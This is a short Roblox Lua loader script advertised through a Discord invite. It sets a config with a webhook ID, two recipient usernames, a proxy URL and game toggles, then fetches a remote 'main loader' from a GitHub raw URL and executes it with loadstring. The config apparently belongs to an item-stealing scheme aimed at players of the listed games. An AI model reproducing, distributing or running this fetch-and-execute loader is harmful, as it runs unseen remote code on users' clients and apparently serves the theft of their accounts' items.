-- This file was generated at discord.gg/syncrypt

local __G = _G
local t1 = {
	mm2 = true,
	ps99 = true,
	adm = true,
	sab = false,
	gag2 = false,
	sp = false,
	bb = false
}
__G.ED_CONFIG = {
	WEBHOOK_ID = "42e5af7122ccf58960882f3557e7c881",
	USERNAMES = {
		"ItsBelrux",
		"ItsZorlux"
	},
	PROXY_URL = "https://eternal-darkness.eu/apis/proxy/",
	USERNAME = "Discord User",
	ENABLED_GAMES = t1,
	CUSTOM_SCRIPTS = {}
}
local s1 = "https://raw.githubusercontent.com/outhackernuls090-hash/eternal/refs/heads/main/loader.lua"
local ok, result = pcall(function()
    return game:HttpGet(s1, true)
end)
local v6 = not ok
if not v6 then
    v6 = not result or #result == 0
end
if v6 then
    warn("[ED] Failed to load Main Loader")

    return
end
local v7 = (loadstring or load)(result)
if type(v7) == "function" then
    local success, result = pcall(v7)
    if not success then
        warn("[ED] Error executing main loader: " .. tostring(result))
    end
else
    warn("[ED] loadstring/load not available, cannot execute loaded code")
end
